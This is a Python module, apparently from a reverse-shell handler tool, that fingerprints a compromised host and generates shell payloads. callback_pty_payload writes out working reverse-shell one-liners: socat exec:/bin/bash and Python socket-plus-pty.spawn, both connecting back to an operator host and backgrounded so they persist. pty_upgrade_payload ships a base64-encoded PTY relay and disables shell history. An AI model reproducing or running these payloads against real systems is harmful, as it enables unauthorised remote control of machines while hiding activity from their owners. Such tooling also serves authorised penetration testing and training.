from __future__ import annotations

import asyncio
import base64
import re
import secrets
import shlex

from ._scan import StreamScanner
from .session import Session

# Hosts get interpolated into shell + python one-liners (see callback_pty_payload),
# so restrict them to the characters that appear in IPv4/IPv6 literals and DNS
# names. A stray quote, space, or shell metacharacter is rejected rather than
# silently producing a broken — or injectable — payload.
_SAFE_HOST_RE = re.compile(r"^[A-Za-z0-9_.:-]{1,255}$")


def validate_target(host: str, port: int) -> str | None:
    """Return a human-readable error if (host, port) is unsafe, else ``None``."""
    if not host or not _SAFE_HOST_RE.match(host):
        return f"unsafe host {host!r} — expected an IP address or hostname"
    try:
        p = int(port)
    except (TypeError, ValueError):
        return f"port not an integer: {port!r}"
    if not (1 <= p <= 65535):
        return f"port out of range (1..65535): {p}"
    return None


# Minimal connect-time probe: exactly `id; uname -a`, nothing else. No sentinels
# and no extra commands, so a freshly-landed shell isn't buried under probe
# noise - the reply reads like a command you'd have typed anyway.
_PROBE_SH = "id; uname -a"

_UID_RE = re.compile(r"uid=\d+\(([^)]+)\)")
# uname -a starts with the kernel name then the nodename (hostname). Anchored per
# line so a surrounding prompt or MOTD doesn't throw the parse off.
_UNAME_RE = re.compile(
    r"^(Linux|Darwin|FreeBSD|OpenBSD|NetBSD|DragonFly|SunOS|"
    r"CYGWIN\S*|MINGW\S*|MSYS\S*)\s+(\S+)\b.*$",
    re.MULTILINE,
)


class Fingerprinter:
    """Sends `id; uname -a` and parses user / OS / hostname from the reply.

    No sentinels: the probe is exactly what an operator types first, so its output
    reads naturally in the pane instead of being wrapped in marker noise. Parsing
    is best-effort and tolerant of a surrounding prompt or MOTD.
    """

    def __init__(self, session: Session) -> None:
        self.session = session
        self._buf = bytearray()
        self._done = asyncio.Event()
        self._got_user = False
        self._got_os = False

    def _on_data(self, session: Session, data: bytes) -> None:
        self._buf += data
        self._parse(self._buf.decode("utf-8", errors="replace"))
        if self._got_user and self._got_os:
            self._done.set()

    def _parse(self, text: str) -> None:
        fp = self.session.fingerprint
        if not self._got_user:
            m = _UID_RE.search(text)
            if m:
                fp.user = m.group(1)
                self._got_user = True
        if not self._got_os:
            m = _UNAME_RE.search(text)
            if m:
                fp.kernel = m.group(0).strip()
                fp.os = _guess_os(m.group(1))
                fp.hostname = m.group(2)
                self._got_os = True
        self.session.save_meta()

    async def run(self, timeout: float = 4.0) -> bool:
        self.session.add_data_hook(self._on_data)
        try:
            await self.session.send((_PROBE_SH + "\n").encode())
            try:
                await asyncio.wait_for(self._done.wait(), timeout=timeout)
                return True
            except TimeoutError:
                # A partial parse (user OR os) is still a usable result.
                return self._got_user or self._got_os
        finally:
            self.session.remove_data_hook(self._on_data)


def _guess_os(kernel: str) -> str:
    k = kernel.lower()
    if "darwin" in k:
        return "macOS"
    if "linux" in k:
        return "Linux"
    if "freebsd" in k:
        return "FreeBSD"
    if "cygwin" in k or "mingw" in k or "msys" in k:
        return "Windows (cygwin)"
    if "windows" in k or "microsoft" in k:
        return "Windows"
    return ""


def pty_upgrade_payload(
    rows: int = 32,
    cols: int = 120,
    term: str = "xterm-256color",
    shell: str = "",
) -> tuple[str, str]:
    """
    Build a PTY-upgrade shell payload and a unique 'ready sentinel' that the target
    will emit once it's through the upgrade. Returns (payload, ready_marker).

    Strategy, in order of preference on the target:
      1. python3  - pty.fork() + execv(shell), VERIFIED: the child must outlive
                    the exec or we emit the fail marker. Then proxy socket ↔ pty.
      2. python   - same relay for Python 2 hosts
      3. script   - OS-appropriate syntax, `|| echo <fail>` on error:
                    Darwin/BSD:  script -q /dev/null <shell>
                    Linux:       script -qc "<shell> -i" /dev/null
      4. none     - emits a clearly marked failure message

    The shell is resolved on-target to one that exists (operator choice / $SHELL,
    then bash, then sh) — never hard-coded — so bash-less hosts (Alpine, busybox
    containers) still upgrade. After spawning, a second line runs stty + TERM + a
    sentinel echo inside the new PTY; seeing the sentinel confirms the upgrade.
    The fail marker is checked first, so a failed spawn can't masquerade as ready.
    """
    ready = f"@@PW_PTY_READY_{secrets.token_hex(4)}@@"
    fail = f"@@PW_PTY_FAIL_{secrets.token_hex(4)}@@"

    # Resolve a shell that ACTUALLY EXISTS on the target. The old payload
    # hard-coded /bin/bash (via an un-exported var), so it blew up on bash-less
    # hosts like Alpine. Prefer the operator's choice / $SHELL, then bash, then
    # sh — exported as $PWSH so the Python relay below can read it.
    if shell:
        shell_resolve = f"PWSH={shlex.quote(shell)}"
    else:
        shell_resolve = 'PWSH="${SHELL:-}"'
    shell_resolve += (
        '; [ -x "$PWSH" ] || PWSH="$(command -v bash 2>/dev/null)"'
        '; [ -x "$PWSH" ] || PWSH="$(command -v sh 2>/dev/null)"'
        "; export PWSH"
    )

    # Python relay: fork a real PTY, exec the shell, and VERIFY the child
    # survived the exec before declaring success. On failure it emits the fail
    # marker (honest result) instead of silently leaving a half-broken shell;
    # on success it proxies socket <-> pty master until the shell exits. Shipped
    # base64-encoded so the multi-line body needs no shell-quoting gymnastics.
    relay = (
        "import pty,os,time,select\n"
        "pid,fd=pty.fork()\n"
        "if pid==0:\n"
        "    sh=os.environ.get('PWSH') or '/bin/sh'\n"
        "    try:\n"
        "        os.execv(sh,[sh,'-i'])\n"
        "    except Exception:\n"
        "        os._exit(127)\n"
        "else:\n"
        "    time.sleep(0.2)\n"
        "    if os.waitpid(pid,os.WNOHANG)[0]:\n"
        f"        os.write(1,b'{fail}')\n"
        "        os._exit(1)\n"
        "    while 1:\n"
        "        try:\n"
        "            r=select.select([0,fd],[],[])[0]\n"
        "        except Exception:\n"
        "            break\n"
        "        if 0 in r:\n"
        "            d=os.read(0,65536)\n"
        "            if not d: break\n"
        "            os.write(fd,d)\n"
        "        if fd in r:\n"
        "            try:\n"
        "                d=os.read(fd,65536)\n"
        "            except OSError:\n"
        "                break\n"
        "            if not d: break\n"
        "            os.write(1,d)\n"
    )
    b64 = base64.b64encode(relay.encode()).decode()
    py = f'import base64;exec(base64.b64decode(\\"{b64}\\"))'

    spawn = (
        f"{shell_resolve}; "
        "if command -v python3 >/dev/null 2>&1; then "
        f'python3 -c "{py}" 2>/dev/null; '
        "elif command -v python >/dev/null 2>&1; then "
        f'python -c "{py}" 2>/dev/null; '
        "elif command -v script >/dev/null 2>&1; then "
        '  U="$(uname 2>/dev/null)"; '
        '  if [ "$U" = Darwin ] || [ "$U" = FreeBSD ] || [ "$U" = OpenBSD ] || [ "$U" = NetBSD ]; then '
        f'    script -q /dev/null "$PWSH" || echo {fail}; '
        "  else "
        f'    script -qc "$PWSH -i" /dev/null || echo {fail}; '
        "  fi; "
        "else "
        f'  echo {fail}; '
        "fi"
    )
    config = (
        f"stty rows {rows} cols {cols} 2>/dev/null; "
        f"export TERM={shlex.quote(term)}; "
        "export HISTFILE=/dev/null 2>/dev/null; "
        f"echo {ready}"
    )
    return (f"{spawn}\n{config}\n", ready)


def callback_pty_payload(host: str, port: int) -> str:
    """Build a fire-and-forget shell payload that opens a *new* socket back to us
    with a real PTY around bash. Caller's existing dumb shell stays as-is —
    the new connection lands as a fresh session in the registry.

    Strategy preference (target side):
      1. socat   — cleanest: `tcp:HOST:PORT exec:/bin/bash,pty,stderr,setsid,sigint,sane`
      2. python3 — fresh socket + pty.spawn(["/bin/bash","-i"])
      3. python  — same as above for Python 2 hosts
      4. fail marker — caller sees `@@PW_RECONNECT_FAIL@@` in scrollback

    We background each via `(... &)` so the spawned proc is reparented to init
    and survives the original shell exiting.
    """
    err = validate_target(host, port)
    if err:
        raise ValueError(err)
    h = host
    p = int(port)
    socat_cmd = (
        f"socat tcp:{h}:{p} exec:/bin/bash,pty,stderr,setsid,sigint,sane"
    )
    py3_cmd = (
        "python3 -c \"import socket,os,pty;"
        f"s=socket.socket();s.connect(('{h}',{p}));"
        "[os.dup2(s.fileno(),f) for f in (0,1,2)];"
        "pty.spawn(['/bin/bash','-i'])\""
    )
    py2_cmd = (
        "python -c \"import socket,os,pty;"
        f"s=socket.socket();s.connect(('{h}',{p}));"
        "[os.dup2(s.fileno(),f) for f in (0,1,2)];"
        "pty.spawn(['/bin/bash','-i'])\""
    )
    return (
        "if command -v socat >/dev/null 2>&1; then "
        f"({socat_cmd} >/dev/null 2>&1 &); "
        "elif command -v python3 >/dev/null 2>&1; then "
        f"({py3_cmd} >/dev/null 2>&1 &); "
        "elif command -v python >/dev/null 2>&1; then "
        f"({py2_cmd} >/dev/null 2>&1 &); "
        "else echo @@PW_RECONNECT_FAIL@@; fi\n"
    )


class PtyUpgrader:
    """Sends the payload and watches for either the success or failure marker."""

    def __init__(self, session: Session, rows: int, cols: int, shell: str = "") -> None:
        self.session = session
        self.rows = rows
        self.cols = cols
        self.shell = shell
        self._scan = StreamScanner()
        self._fail = b"@@PW_PTY_FAIL_"
        self._ok = asyncio.Event()
        self._failed = False
        self._ready_marker = b""

    def _on_data(self, s: Session, data: bytes) -> None:
        self._scan.feed(data)
        if self._scan.find(self._fail) >= 0:
            self._failed = True
            self._ok.set()
        elif self._ready_marker and self._scan.find(self._ready_marker) >= 0:
            self._ok.set()

    async def run(self, timeout: float = 6.0) -> tuple[bool, str]:
        """Returns (success, message)."""
        payload, marker = pty_upgrade_payload(self.rows, self.cols, shell=self.shell)
        self._ready_marker = marker.encode()
        self.session.add_data_hook(self._on_data)
        try:
            await self.session.send(payload.encode())
            try:
                await asyncio.wait_for(self._ok.wait(), timeout=timeout)
            except TimeoutError:
                return (False, "no response — target may have no python/script, or isn't a shell")
            if self._failed:
                return (False, "target has no python or script — PTY upgrade impossible from here")
            return (True, f"PTY ready ({self.rows}×{self.cols})")
        finally:
            self.session.remove_data_hook(self._on_data)
